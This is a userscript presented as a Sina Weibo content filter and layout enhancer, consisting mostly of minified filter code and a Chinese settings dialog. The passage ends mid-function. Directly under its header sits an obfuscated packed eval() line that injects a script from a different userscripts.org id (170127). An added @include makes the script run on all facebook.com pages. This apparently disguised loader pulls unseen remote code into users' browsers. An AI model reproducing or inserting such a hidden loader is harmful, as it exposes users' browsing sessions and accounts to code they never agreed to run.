// ==UserScript==
// @name			眼不见心不烦（新浪微博） Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace		http://weibo.com/salviati
// @license			MIT License
// @description		新浪微博（weibo.com）非官方功能增强脚本，具有屏蔽关键词、用户、来源、链接，改造版面等功能
// @features		可选择点击“查看大图”直接打开大图；增加对首页时间线“好友关注”的屏蔽；更新后首次使用时显示新功能
// @version			1.1.3
// @revision		82
// @author			@富平侯
// @committers		@牛肉火箭, @JoyerHuang_悦
// @grant			GM_getValue
// @grant			GM_setValue
// @grant			GM_xmlhttpRequest
// @grant			unsafeWindow
// @include			http://weibo.com/*
// @include			http://www.weibo.com/*
// @updateURL		https://userscripts.org/scripts/source/114087.meta.js
// @downloadURL		https://userscripts.org/scripts/source/114087.user.js
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

(function(){function w(){var d={keyword:[],string:"",bool:!1,array:[],object:{},internal:null},c;for(c in this.items)this[c]=1<this.items[c].length?this.items[c][1]:d[this.items[c][0]]}var c=function(){var c=function(c){return document.getElementById(c)};c.version=Number("82");c.select=function(c,d){d||(d=document);return d.querySelector(c)};if(window.chrome){if(localStorage.getItem("weiboPlus.chromeExtInstalled")){console.warn("已安装插件版本，脚本停止运行！");return}var d=window.navigator.userAgent.match(/Chrome\/(\d+)/)&&
RegExp.$1;!localStorage.getItem("weiboPlus.chromeExtTip")&&confirm("以用户脚本方式安装的“眼不见心不烦”插件将在Chrome 27及更高版本下失效。\n\n推荐您【卸载】本插件并到【Chrome应用商店】安装新版插件，点击“确定”即可转入安装页面。\n\n该版本支持更高版本的Chrome，并加入了Chrome浏览器的专属功能（如设置同步）。")&&window.open("https://chrome.google.com/webstore/detail/aognaapdfnnldnjglanfbbklaakbpejm","_blank");localStorage.setItem("weiboPlus.chromeExtTip",!0);if(null===d||27<=d){if("undefined"===typeof unsafeWindow){console.warn("不支持Chrome "+d+"，脚本停止运行！");return}console.warn("使用第三方扩展提供的unsafeWindow");
c.window=unsafeWindow}else c.window=function(){console.warn("Chrome "+d+": 通过注入脚本获取unsafeWindow");var c=document.createElement("div");c.setAttribute("onclick","return window;");return c.onclick()}()}else{if("undefined"===typeof unsafeWindow){alert("当前版本的“眼不见心不烦”(v1.1.3)不支持您使用的浏览器。\n\n插件目前只对Firefox和Chrome浏览器提供官方支持。");return}c.window=unsafeWindow}c.config=c.window.$CONFIG;if(c.config&&(c.uid=c.config.uid,c.uid))return c.STK=c.window.STK,!GM_getValue||GM_getValue.toString&&-1<GM_getValue.toString().indexOf("not supported")?
(c.get=function(c,d,g){c=localStorage.getItem("weiboPlus."+c);null===c&&(c=d);if("function"===typeof g)g(c);else return c},c.set=function(c,d){localStorage.setItem("weiboPlus."+c,d)}):(c.get=function(c,d,g){c=GM_getValue(c,d);if("function"===typeof g)g(c);else return c},c.set=GM_setValue),c.remove=function(c){c&&c.parentNode.removeChild(c)},c.click=function(c,d){c&&c.addEventListener("click",d,!1)},c.scope=function(){return document.body.classList.contains("B_index")?1:document.body.classList.contains("B_profile")?
2:0},c}();if(!c)return!1;if(c.config.any&&-1===c.config.any.indexOf("wvr=5"))return confirm("您使用的“眼不见心不烦”版本(v1.1.3)不支持旧版微博。\n请升级到新版微博（V5），或使用较低版本（v1.0.6）的“眼不见心不烦”插件。\n如果您希望安装旧版“眼不见心不烦”，请点击“确认”。")&&window.open("http://code.google.com/p/weibo-content-filter/downloads/list","_blank"),!1;w.prototype={items:{version:["internal",0],whiteKeywords:["keyword"],blackKeywords:["keyword"],grayKeywords:["keyword"],URLKeywords:["keyword"],sourceKeywords:["keyword"],sourceGrayKeywords:["keyword"],userBlacklist:["array"],
tipBackColor:["string","#FFD0D0"],tipTextColor:["string","#FF8080"],readerModeIndex:["bool"],readerModeProfile:["bool"],readerModeTip:["internal",!1],readerModeWidth:["string",750],readerModeBackColor:["string","rgba(100%,100%,100%,0.8)"],mergeSidebars:["bool"],floatSidebar:["bool"],unwrapText:["bool"],directBigImg:["bool"],showAllGroups:["bool"],showAllMsgNav:["bool"],noDefaultFwd:["bool"],noDefaultGroupPub:["bool"],overrideMyBack:["bool"],overrideOtherBack:["bool"],backColor:["string","rgba(100%,100%,100%,0.2)"],
overrideMySkin:["bool"],overrideOtherSkin:["bool"],skinID:["string","skinvip001"],filterOthersOnly:["bool"],filterPaused:["bool"],filterSmiley:["bool"],filterPromotions:["bool",!0],filterDeleted:["bool"],filterFeelings:["bool"],filterDupFwd:["bool"],maxDupFwd:["string",1],filterFlood:["bool"],maxFlood:["string",5],autoUpdate:["bool",!0],updateNotify:["bool",!0],floatBtn:["bool",!0],useCustomStyles:["bool",!0],customStyles:["string"],hideMods:["array"]},strip:function(){var c={},d;for(d in this.items)"internal"!==
this.items[d][0]&&(c[d]=this[d]);return JSON.stringify(c)},save:function(d){c.set(c.uid.toString(),JSON.stringify(this))},load:function(c,d){var h={};if(c)try{if(h=JSON.parse(c.replace(/\n/g,"")),"object"!==typeof h)throw 0;}catch(f){h={},c=null}for(var l in this.items)l in h&&(this[l]=h[l]);return null!==c}};var d=new w,D=function(){var g=function(d){GM_xmlhttpRequest({method:"GET",url:"http://userscripts.org/scripts/source/114087.meta.js?"+(new Date).getTime(),headers:{"Cache-Control":"no-cache"},
onload:function(g){if(g.responseText.match(/@version\s+(.*)/)){c.set("lastCheckUpdateSuccess",(new Date).getTime().toString());var k=RegExp.$1;if(!g.responseText.match(/@revision\s+(\d+)/)||RegExp.$1<=c.version)d&&alert("您使用的“眼不见心不烦”(v1.1.3)已经是最新版。");else{var h="";g.responseText.match(/@features\s+(.*)/)&&(h="- "+RegExp.$1.split("；").join("\n- ")+"\n\n");confirm("“眼不见心不烦”新版本v"+k+"可用。\n\n"+h+"如果您希望更新，请点击“确认”打开插件主页。")&&window.open("http://userscripts.org/scripts/show/114087","_blank")}}}})};if(d.autoUpdate){var k=
c.get("lastCheckUpdateAttempt",0),h=(new Date).getTime();12E4<h-k&&(c.set("lastCheckUpdateAttempt",h.toString()),k=c.get("lastCheckUpdateSuccess",0),6048E5<h-k&&g())}return g}(),B=function(){var g=!1,k,h,f=function(b){return h.getDom(b)},l=function(b,a,d){c.STK.core.evt.addEvent(h.getDom(b),d||"click",a)},v=function(b,a){return Array.prototype.map.call(f(b).childNodes,function(b){return a?b.getAttribute(a):b.textContent})},q=function(b,a,d){var e;if(a instanceof Array)e=a;else{e=[];for(var g=" "+
f(a).value+" ",n=RegExp('(\\s"([^"]+)"\\s|\\s([^\\s]+)\\s)',"g"),k;null!==(k=n.exec(g));)e.push(k[2]||k[3]),--n.lastIndex}e=e.filter(function(a){if(!a||-1<v(b,d).indexOf(a))return!1;var c=document.createElement("a");if(2<a.length&&"/"===a.charAt(0)&&"/"===a.charAt(a.length-1)){try{RegExp(a.substring(1,a.length-1)).test("")}catch(e){return!0}c.className="regex"}c.title="点击删除";c.setAttribute("action-type","remove");d&&c.setAttribute(d,a);c.href="javascript:void(0)";c.textContent=a;f(b).appendChild(c);
return!1});a instanceof Array||(f(a).value=e.join(" "),e.length&&c.STK.common.extra.shine(f(a)))},p=!1,m=function(b,a){var d=!a,e=f(b);if(!d||!p){var g=d?v(b,"uid"):f(a).value.split(" "),k=g.length,n=[],h=c.STK.common.trans.relation.getTrans("userCard",{onComplete:function(g,h){var s;s=d?e.querySelector('a[uid="'+h.id+'"]'):document.createElement("a");if("100000"===g.code){var l=g.data.match(/<img[^>]+>/)[0];d||(h.id=l.match(/uid="([^"]+)"/)[1]);if(d||-1===v(b,"uid").indexOf(h.id))s.innerHTML="<img "+
l.match(/src="[^"]+"/)[0]+" /><br />"+l.match(/title="([^"]+)"/)[1],d||(s.title="点击删除",s.href="javascript:void(0)",s.setAttribute("uid",h.id),s.setAttribute("action-type","remove"),e.appendChild(s))}else d?s.innerHTML+="<br />（未找到）":n.push(h.name);0===--k&&(f(a).value=n.join(" "),n.length&&c.STK.common.extra.shine(f(a)))}});g.forEach(function(a){var b={type:1};d?b.id=a:b.name=a;h.request(b)});p=!0}},u=function(){var b=new w,a;for(a in b.items)switch(b.items[a][0]){case "keyword":b[a]=v(a+"List");
break;case "string":b[a]=f(a).value;break;case "bool":b[a]=f(a).checked;break;case "array":b[a]=[];break;case "object":b[a]={};break;case "internal":b[a]=d[a]}b.userBlacklist=v("userBlacklist","uid");for(var c in r.modules)f("hide"+c).checked&&b.hideMods.push(c);f("settingsString").value=b.strip();return b},e=function(b){for(var a in b.items)switch(b.items[a][0]){case "keyword":f(a).value="";f(a+"List").innerHTML="";q(a+"List",b[a]);break;case "string":f(a).value=b[a];break;case "bool":f(a).checked=
b[a]}f("userBlacklistNew").value="";f("userBlacklist").innerHTML="";q("userBlacklist",b.userBlacklist,"uid");p=!1;a=f("tipBackColor").value;var c=f("tipTextColor").value,d=f("tipSample");d.style.backgroundColor=a;d.style.borderColor=c;d.style.color=c;for(var e in r.modules)f("hide"+e).checked=-1<b.hideMods.indexOf(e);f("settingsString").value=b.strip()},s=function(){k=c.STK.ui.dialog({isHold:!0});k.setTitle("“眼不见心不烦”(v1.1.3)设置");h=(c.STK.module.layer||c.STK.ui.mod.layer)('<div node-type="outer" class="detail wbpSettings" style="padding: 0 20px 20px"><div class="clearfix"><div style="float: left">新浪微博<span style="color: red">非官方</span>功能增强脚本。</div><div style="float: right; display: inline; position: relative"><a node-type="checkUpdate" href="javascript:void(0);" title="检查脚本是否有新版本">检查更新</a><em class="W_vline">|</em><a href="http://userscripts.org/scripts/show/114087" title="新版本在此页面发布" target="_blank">插件主页</a><em class="W_vline">|</em><a href="http://code.google.com/p/weibo-content-filter/wiki/FAQ" title="遇到问题请先阅读FAQ" target="_blank">常见问题</a><em class="W_vline">|</em><a href="/salviati" title="欢迎私信、评论或@作者提出脚本建议" target="_blank">联系作者</a><em class="W_vline">|</em><a href="http://me.alipay.com/salviati" title="欢迎向作者提供捐助以支持插件的后续开发" target="_blank">捐助插件</a></div></div><div class="clearfix"><div node-type="tabHeaders" class="wbpTabHeaders"><a tab="tabKeywords" href="javascript:void(0);" class="current">关键词</a><a tab="tabLinks" href="javascript:void(0);">链接地址</a><a node-type="tabHeaderUser" tab="tabUser" href="javascript:void(0);">用户</a><a tab="tabSource" href="javascript:void(0);">来源</a><a tab="tabAdvanced" href="javascript:void(0);">高级</a><a tab="tabModules" href="javascript:void(0);">模块</a><a tab="tabModify" href="javascript:void(0);">改造版面</a><a node-type="tabHeaderSettings" tab="tabSettings" href="javascript:void(0);">设置</a></div><div node-type="inner" style="float: right; width: 440px"><div node-type="tabKeywords"><div class="clearfix"><div style="float: left"><input type="checkbox" node-type="filterSmiley"><label title="如果选中，[呵呵]等表情也可以作为关键词被屏蔽">允许表情关键词</label></div><div style="float: right; display: inline; position: relative"><span class="link"><a href="javascript:void(0);" style="cursor: help">关键词设置帮助<span><ul><li>如果要添加的关键词中有空格，可将其置于一对<span style="color: blue">半角双引号</span>内，如<span style="color: green">"I love you"</span></li><li>使用<span style="color: blue">加号</span>分隔需要同时出现的关键词，如<span style="color: green">A+B+C</span>代表A、B、C三个词必须同时出现</li><li>使用<span style="color: blue">斜杠</span>设置正则表达式关键词，如<span style="color: green">/转发并@.{2,3}好友/</span></li></ul></span></a></span></div></div><div class="wbpKeywordBlock"><em>白名单</em>包含下列关键词的微博不会被屏蔽<table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td><div class="wbpInput"><input type="text" node-type="whiteKeywords" class="input" placeholder="多个关键词用空格隔开；不区分大小写；区分简繁体"></div></td><td class="wbpToolBtns"><a href="javascript:void(0);" class="W_btn_b" action-type="add" action-data="list=whiteKeywordsList&text=whiteKeywords"><span>添加</span></a><a href="javascript:void(0);" class="W_btn_b" action-type="clear" action-data="list=whiteKeywordsList"><span>清空</span></a></td></tr></tbody></table><div class="wbpListWrapper"><div node-type="whiteKeywordsList" class="wbpKeywordsList wbpWhiteKeywordsList"></div></div></div><div class="wbpKeywordBlock"><em>黑名单</em>包含下列关键词的微博将被屏蔽<table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td><div class="wbpInput"><input type="text" node-type="blackKeywords" class="input" placeholder="多个关键词用空格隔开；不区分大小写；区分简繁体"></div></td><td class="wbpToolBtns"><a href="javascript:void(0);" class="W_btn_b" action-type="add" action-data="list=blackKeywordsList&text=blackKeywords"><span>添加</span></a><a href="javascript:void(0);" class="W_btn_b" action-type="clear" action-data="list=blackKeywordsList"><span>清空</span></a></td></tr></tbody></table><div class="wbpListWrapper"><div node-type="blackKeywordsList" class="wbpKeywordsList wbpBlackKeywordsList"></div></div></div><div class="wbpKeywordBlock"><em>灰名单</em>包含下列关键词的微博将被屏蔽<span style="color: red">并提示</span><table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td><div class="wbpInput"><input type="text" node-type="grayKeywords" class="input" placeholder="多个关键词用空格隔开；不区分大小写；区分简繁体"></div></td><td class="wbpToolBtns"><a href="javascript:void(0);" class="W_btn_b" action-type="add" action-data="list=grayKeywordsList&text=grayKeywords"><span>添加</span></a><a href="javascript:void(0);" class="W_btn_b" action-type="clear" action-data="list=grayKeywordsList"><span>清空</span></a></td></tr></tbody></table><div class="wbpListWrapper"><div node-type="grayKeywordsList" class="wbpKeywordsList wbpGrayKeywordsList"></div></div><table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin-top: 0px"><tbody><tr><td style="width: 110px">屏蔽提示背景颜色：</td><td><div class="wbpInput"><input type="text" node-type="tipBackColor" class="input"></div></td><td style="width: 15px"></td><td style="width: 110px">屏蔽提示文字颜色：</td><td><div class="wbpInput"><input type="text" node-type="tipTextColor" class="input"></div></td></tr></tbody></table><table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td style="width: 40px">示例：</td><td><div node-type="tipSample" class="wbpTip" style="margin-bottom: 10px">本条来自<a href="javascript:void(0);">@某人</a>的微博因包含关键词“<a href="javascript:void(0);">XXXX</a>”而被隐藏，点击显示</div></td></tr></tbody></table></div></div><div node-type="tabLinks" style="display: none"><p>如果一条微博中包含链接且目标地址中包含下列关键词，微博将被屏蔽（无提示）。如将taobao.com设为关键词可屏蔽所有包含淘宝链接的微博。</p><table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td><div class="wbpInput"><input type="text" node-type="URLKeywords" class="input" placeholder="多个关键词用空格隔开；不区分大小写；区分简繁体"></div></td><td class="wbpToolBtns"><a href="javascript:void(0);" class="W_btn_b" action-type="add" action-data="list=URLKeywordsList&text=URLKeywords"><span>添加</span></a><a href="javascript:void(0);" class="W_btn_b" action-type="clear" action-data="list=URLKeywordsList"><span>清空</span></a></td></tr></tbody></table><div class="wbpListWrapper"><div node-type="URLKeywordsList" class="wbpKeywordsList wbpBlackKeywordsList"></div></div></div><div node-type="tabUser" style="display: none"><p>如果一条微博的发布者或转发原文的作者为下列用户之一，微博将被屏蔽。除了在此处添加屏蔽用户，您还可以将鼠标悬停在用户链接上，在弹出的信息气球上点击“屏蔽”。</p><table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td><div class="wbpInput"><input type="text" node-type="userBlacklistNew" class="input" placeholder="多个用户名用空格隔开；不要加上前面的@；不区分大小写"></div></td><td class="wbpToolBtns"><a href="javascript:void(0);" class="W_btn_b" action-type="addUser" action-data="list=userBlacklist&text=userBlacklistNew"><span>添加</span></a><a href="javascript:void(0);" class="W_btn_b" action-type="clear" action-data="list=userBlacklist"><span>清空</span></a></td></tr></tbody></table><div class="wbpListWrapper" style="max-height: 230px"><div node-type="userBlacklist" class="wbpUserList wbpBlackKeywordsList"></div></div></div><div node-type="tabSource" style="display: none"><p>如果一条微博的来源（包括转发原文的来源）名称中包含指定关键词，微博将被屏蔽。如将“时光机”设为关键词可屏蔽所有来自<a href="http://time.xuapp.com/" target="_blank">时光机</a>或<a href="http://weibo.pp.cc/time/" target="_blank">皮皮时光机</a>等应用的微博。</p><div class="wbpKeywordBlock"><em>黑名单</em>来源名称包含下列关键词的微博将被屏蔽<table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td><div class="wbpInput"><input type="text" node-type="sourceKeywords" class="input" placeholder="多个关键词用空格隔开；不区分大小写；区分简繁体"></div></td><td class="wbpToolBtns"><a href="javascript:void(0);" class="W_btn_b" action-type="add" action-data="list=sourceKeywordsList&text=sourceKeywords"><span>添加</span></a><a href="javascript:void(0);" class="W_btn_b" action-type="clear" action-data="list=sourceKeywordsList"><span>清空</span></a></td></tr></tbody></table><div class="wbpListWrapper"><div node-type="sourceKeywordsList" class="wbpKeywordsList wbpBlackKeywordsList"></div></div></div><div class="wbpKeywordBlock"><em>灰名单</em>来源名称包含下列关键词的微博将被屏蔽<span style="color: red">并提示</span><table width="100%" border="0" cellspacing="0" cellpadding="0"><tbody><tr><td><div class="wbpInput"><input type="text" node-type="sourceGrayKeywords" class="input" placeholder="多个关键词用空格隔开；不区分大小写；区分简繁体"></div></td><td class="wbpToolBtns"><a href="javascript:void(0);" class="W_btn_b" action-type="add" action-data="list=sourceGrayKeywordsList&text=sourceGrayKeywords"><span>添加</span></a><a href="javascript:void(0);" class="W_btn_b" action-type="clear" action-data="list=sourceGrayKeywordsList"><span>清空</span></a></td></tr></tbody></table><div class="wbpListWrapper"><div node-type="sourceGrayKeywordsList" class="wbpKeywordsList wbpGrayKeywordsList"></div></div></div></div><div node-type="tabAdvanced" style="display: none"><p>注意：对于所有屏蔽微博的功能，白名单具有最高优先级；如果一条微博包含白名单中的关键词，则<span style="color: red">一定不会</span>被屏蔽。</p><p><input type="checkbox" node-type="filterOthersOnly"><label>不要屏蔽我自己发布的微博</label></p><p><input type="checkbox" node-type="filterPaused"><label><span style="color: red">暂停屏蔽</span>：选中时暂时停止屏蔽微博</label></p><p><input type="checkbox" node-type="filterPromotions"><label>屏蔽推广微博</label></p><p><input type="checkbox" node-type="filterDeleted"><label>屏蔽已删除微博的转发</label></p><p><input type="checkbox" node-type="filterFeelings"><label>屏蔽写心情微博</label></p><div style="margin-top: 8px"><input type="checkbox" node-type="filterDupFwd"><label>反版聊：同一条微博的转发最多显示</label><div class="wbpInput wbpInlineInput"><input type="text" node-type="maxDupFwd" class="input"></div>条</div><div style="margin-top: 5px"><input type="checkbox" node-type="filterFlood"><label>反刷屏：来自同一用户的微博最多显示</label><div class="wbpInput wbpInlineInput"><input type="text" node-type="maxFlood" class="input"></div>条</div></div><div node-type="tabModules" class="wbpTabModules" style="display: none"><p>请选择要屏蔽的版面内容。</p><table width="100%" border="0" cellspacing="0" cellpadding="0" style="line-height: 24px; margin-top: 15px"><tbody><tr><td><input type="checkbox" node-type="hideAds"><label>版面及嵌入广告</label></td><td><input type="checkbox" node-type="hideFooter"><label>页底链接模块</label></td></tr><tr><td><input type="checkbox" node-type="hideActivity"><label>微活动（发布框下方）</label></td><td><input type="checkbox" node-type="hideRecommendedTopic"><label>热点微话题（发布框右上）</label></td></tr><tr><td><input type="checkbox" node-type="hideApp"><label>我的应用（左边栏）</label></td><td><input type="checkbox" node-type="hideRecomFeed"><label>精彩微博推荐（首页时间线）</label></td></tr><tr><td><input type="checkbox" node-type="hideCommentTip"><label>微博活动横幅（评论栏）</label></td><td><input type="checkbox" node-type="hideMemberTip"><label>开通微博会员横幅（页底）</label></td></tr><tr><td><input type="checkbox" node-type="hideFriendFollow"><label><span style="color: blue">好友关注（首页时间线）</span></label></td><td><input type="checkbox" node-type="hideFollowGuide"><label>“为你推荐”弹窗（新用户）</label></td></tr><tr class="wbpRowSpacing"><td><input type="checkbox" node-type="hideStats"><label>关注/粉丝/微博数</label></td><td><input type="checkbox" node-type="hideLevel"><label>微博等级</label></td></tr><tr><td><input type="checkbox" node-type="hideInterestUser"><label>可能感兴趣的人</label></td><td><input type="checkbox" node-type="hideTopic"><label>热门话题/关注的话题</label></td></tr><tr><td><input type="checkbox" node-type="hideTopComment"><label>热评微博（“我的评论”页）</label></td><td><input type="checkbox" node-type="hideMember"><label>会员专区</label></td></tr><tr><td><input type="checkbox" node-type="hideAllInOne"><label>微吧/微刊/应用</label></td><td><input type="checkbox" node-type="hideNotice"><label>公告栏</label></td></tr><tr class="wbpRowSpacing"><td><input type="checkbox" node-type="hideVerifyIcon"><label>个人/机构认证标识</label><a href="http://verified.weibo.com/verify" target="_blank"><i class="W_ico16 approve"></i><i class="W_ico16 approve_co"></i></a></td><td><input type="checkbox" node-type="hideDarenIcon"><label>微博达人标识</label><a href="http://club.weibo.com/intro" target="_blank"><i class="W_ico16 ico_club"></i></a></td></tr><tr><td><input type="checkbox" node-type="hideMemberIcon"><label>微博会员标识</label><a href="http://vip.weibo.com/" target="_blank"><i class="W_ico16 ico_member"></i><i class="W_ico16 ico_member_dis"></i></a></td><td><input type="checkbox" node-type="hideVgirlIcon"><label>微博女郎标识</label><a href="http://vgirl.weibo.com/" target="_blank"><i class="W_ico16 ico_vlady"></i></a></td></tr><tr><td><input type="checkbox" node-type="hidePaiIcon"><label>随手拍求点评</label><a href="http://pai.weibo.com/" target="_blank"><i class="W_ico16 ico_pai"></i></a></td></tr><tr class="wbpRowSpacing"><td><input type="checkbox" node-type="hideProfCover"><label>封面图（个人主页）</label></td><td><input type="checkbox" node-type="hideProfStats"><label>关注/粉丝/微博数（个人主页）</label></td></tr><tr><td><input type="checkbox" node-type="hideMedal"><label>勋章（个人主页）</label></td><td><input type="checkbox" node-type="hideNofollow"><label>加关注（未关注用户的个人主页）</label></td></tr><tr><td colspan="2"><input type="checkbox" node-type="hideMyRightSidebar"><label><span style="color: red">个人主页右边栏</span>：选中后整个右边栏将被去除</label></td></tr><tr><td><input type="checkbox" node-type="hideMyRelation"><label>我的关注/粉丝（个人主页）</label></td><td><input type="checkbox" node-type="hideRelation"><label>微关系（个人主页）</label></td></tr><tr><td><input type="checkbox" node-type="hideAlbum"><label>微相册（个人主页）</label></td><td><input type="checkbox" node-type="hideAppWidget"><label>应用卡片（微游戏等，个人主页）</label></td></tr><tr class="wbpRowSpacing"><td colspan="2"><input type="checkbox" node-type="hideFeedRightSidebar"><label><span style="color: red">单条微博右边栏</span>：选中后整个右边栏将被去除</label></td></tr></tr><tr><td><input type="checkbox" node-type="hideRecomPerson"><label>微博相关人（单条微博）</label></td><td><input type="checkbox" node-type="hideRecomTopic"><label>推荐话题（单条微博）</label></td></tr><tr><td><input type="checkbox" node-type="hideRecomWeibo"><label>推荐微博（单条微博）</label></td><td><input type="checkbox" node-type="hideHotWeibo"><label>热门微博（单条微博）</label></td></tr><tr><td><input type="checkbox" node-type="hideRecomWeiba"><label>推荐微吧（单条微博）</label></td><td><input type="checkbox" node-type="hideRecomWeikan"><label>推荐微刊（单条微博）</label></td></tr></tbody></table><p style="margin-top: 15px"><a href="javascript:void(0);" class="W_btn_b" node-type="hideAll"><span>全选</span></a><a href="javascript:void(0);" class="W_btn_b" node-type="hideInvert" style="margin-left: 5px"><span>反选</span></a></p></div><div node-type="tabModify" style="display: none"><p><input type="checkbox" node-type="mergeSidebars"><label><span style="color: red">双栏版式</span>（将左边栏并入右边栏）</label></p><p><input type="checkbox" node-type="floatSidebar"><label><span style="color: red">浮动常用边栏</span>（常用边栏随页面滚动）</label></p><p><input type="checkbox" node-type="showAllGroups"><label>始终显示所有分组</label></p><p><input type="checkbox" node-type="showAllMsgNav"><label>始终显示所有消息导航条（左边栏“消息”下的“提到我的”、“评论”等）</label></p><p><input type="checkbox" node-type="unwrapText"><label>微博作者与正文间不折行</label></p><p><input type="checkbox" node-type="directBigImg"><label><span style="color: blue">点击“查看大图”直接打开大图</span></label></p><p><input type="checkbox" node-type="noDefaultFwd"><label>禁止在评论时默认选中“同时转发到我的微博”</label></p><p><input type="checkbox" node-type="noDefaultGroupPub"><label>禁止在浏览分组时默认发布新微博到该分组</label></p><div style="margin-top: 15px">在<input type="checkbox" node-type="readerModeIndex" style="margin: 0 2px 0 8px"><label>我的首页</label><input type="checkbox" node-type="readerModeProfile" style="margin: 0 2px 0 8px"><label style="margin-right: 8px">个人主页</label>启用极简阅读模式<span style="color: red">（可按F8切换）</span><table width="100%" border="0" cellspacing="0" cellpadding="0" style="margin-top: 3px"><tbody><tr><td style="width: 85px; padding-left: 19px">宽度（像素）：</td><td><div class="wbpInput" style="width: 40px"><input type="text" node-type="readerModeWidth" class="input"></div></td><td style="width: 60px">背景颜色：</td><td><div class="wbpInput"><input type="text" node-type="readerModeBackColor" class="input"></div></td></tr></tbody></table></div><div style="margin-top: 10px">设置<input type="checkbox" node-type="overrideMyBack" style="margin: 0 2px 0 8px"><label>我的首页</label><input type="checkbox" node-type="overrideOtherBack" style="margin: 0 2px 0 8px"><label style="margin-right: 8px">个人主页</label>透明背景色<div class="wbpInput wbpInlineInput" style="width: 190px" title="最后一个参数为透明度，0为全透明，1为不透明"><input type="text" node-type="backColor" class="input"></div></div><div style="margin-top: 10px">覆盖<input type="checkbox" node-type="overrideMySkin" style="margin: 0 2px 0 8px"><label>我的首页</label><input type="checkbox" node-type="overrideOtherSkin" style="margin: 0 2px 0 8px"><label style="margin-right: 8px">个人主页</label>模板设置为<div class="wbpInput wbpInlineInput" style="width: 80px" title="普通模板为“skin+三位数字编号”，如skin012\n会员专属模板为“skinvip+三位数字编号”，如skinvip012\n默认模板为default"><input type="text" node-type="skinID" class="input"></div>（仅自己可见）</div><p style="margin-top: 10px"><input type="checkbox" node-type="useCustomStyles"><label><span style="color: red">自定义样式</span>（CSS）：可用于屏蔽模块、改造版面，</label><a href="http://code.google.com/p/weibo-content-filter/wiki/CustomCSS" target="_blank">点此查看示例</a></p><textarea node-type="customStyles" rows="6" style="margin-top: 5px"></textarea></div><div node-type="tabSettings" style="display: none"><p><input type="checkbox" node-type="autoUpdate"><label>每周自动检查更新</label></p><p><input type="checkbox" node-type="updateNotify"><label><span style="color: blue">更新后首次使用时显示新功能</span></label></p><p><input type="checkbox" node-type="floatBtn"><label>浮动设置按钮（“返回顶部”浮动按钮下方）</label></p><div class="clearfix" style="margin-top: 8px"><div style="float: left; width: 385px"><p>当前账号的设置信息在下列文本框中，您可以将其复制到其它位置保存。需要导入设置时，请将设置信息粘贴到文本框中，然后点击“导入”。</p></div><a href="javascript:void(0)" class="W_btn_b" node-type="import" style="float: right; margin-top: 6px"><span>导入</span></a></div><textarea node-type="settingsString" rows="10"></textarea></div></div></div><p class="btn"><a href="javascript:void(0);" class="W_btn_a" node-type="OK"><span>确定</span></a><a href="javascript:void(0);" class="W_btn_c" node-type="cancel"><span>取消</span></a></p></div>');
k.setContent(h.getOuter());l("tipBackColor",function(){f("tipSample").style.backgroundColor=this.value},"blur");l("tipTextColor",function(){f("tipSample").style.borderColor=this.value;f("tipSample").style.color=this.value},"blur");var b=c.STK.core.evt.delegatedEvent(h.getInner());b.add("add","click",function(a){q(a.data.list,a.data.text)});b.add("clear","click",function(a){f(a.data.list).innerHTML=""});b.add("remove","click",function(a){c.remove(a.el)});b.add("addUser","click",function(a){m(a.data.list,
a.data.text)});l("inner",function(a){var b=a.target;b.parentNode&&"LABEL"===b.parentNode.tagName&&(b=b.parentNode);"LABEL"===b.tagName&&(a.preventDefault(),a.stopPropagation(),b.getAttribute("for")?f(b.getAttribute("for")).click():b.previousSibling.click())});l("tabHeaders",function(a){var b=a.target;b&&"A"===b.tagName&&(b.className="current",f(b.getAttribute("tab")).style.display="",Array.prototype.forEach.call(this.childNodes,function(a){b!==a&&(a.className="",f(a.getAttribute("tab")).style.display=
"none")}))});l("tabHeaderSettings",u);l("tabHeaderUser",function(){m("userBlacklist")});l("hideAll",function(){for(var a in r.modules)f("hide"+a).checked=!0});l("hideInvert",function(){for(var a in r.modules){var b=f("hide"+a);b.checked=!b.checked}});l("import",function(){var a=new w;a.load(f("settingsString").value)?(e(a),alert("设置导入成功！")):alert("设置导入失败！\n设置信息格式有问题。")});l("checkUpdate",D);l("OK",function(){d=u();d.save();C();r();k.hide()});l("cancel",k.hide);c.STK.custEvent.add(k,"hide",function(){g=
!1})},n=function(){k||s();g=!0;e(d);f("tabHeaderUser").classList.contains("current")&&m("userBlacklist");k.show().setMiddle()};n.shown=function(){return g};return n}(),C=function(){var g={},k={},h=function(c,f){var g=c.toLowerCase(),b=d[f];if(""===c||0===b.length)return"";b=b.filter(function(a){if(!a)return!1;if(2<a.length&&"/"===a.charAt(0)&&"/"===a.charAt(a.length-1))try{return RegExp(a.substring(1,a.length-1)).test(c)}catch(b){}else return a.split("+").every(function(a){return-1<g.indexOf(a.toLowerCase())});
return!1});return b.length?b[0]:""},f=document.createElement("div"),l=function(c){return d.filterSmiley?(f.innerHTML=c.innerHTML.replace(/<img[^>]+alt="(\[[^\]">]+\])"[^>]*>/g,"$1").replace(/<\/?[^>]+>/g,"").replace(/[\r\n\t]/g,"").trim(),f.textContent):c.textContent.replace(/[\r\n\t]/g,"").trim()},v=function(c,d){c=c?c.title||c.textContent:"未通过审核应用";return h(c,d)},q=function(e){e.firstChild&&"wbpTip"===e.firstChild.className&&(e.removeChild(e.firstChild),e.removeChild(e.firstChild));var f=e.getAttribute("mid");
